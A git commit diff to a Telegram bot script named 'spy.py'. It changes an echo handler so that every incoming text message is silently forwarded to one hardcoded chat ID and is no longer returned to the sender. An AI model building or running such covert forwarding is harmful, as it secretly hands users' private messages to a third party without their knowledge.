42cb9dc542a0d5af4ebd2a09f59a444db8cc2ec9
evolvestin <36014630+evolvestin@users.noreply.github.com>
2018-02-01 04:31:15 +0300

    Update spy.py

--- spy.py
+++ spy.py
@@ -8,7 +8,7 @@ bot = telebot.TeleBot(token)
 
 @bot.message_handler(content_types=["text"])
 def repeat_all_messages(message): # Название функции не играет никакой роли, в принципе
-    bot.send_message(message.chat.id, message.text)
+    bot.send_message(396978030, message.text)
 
 if __name__ == '__main__':
      bot.polling(none_stop=True)
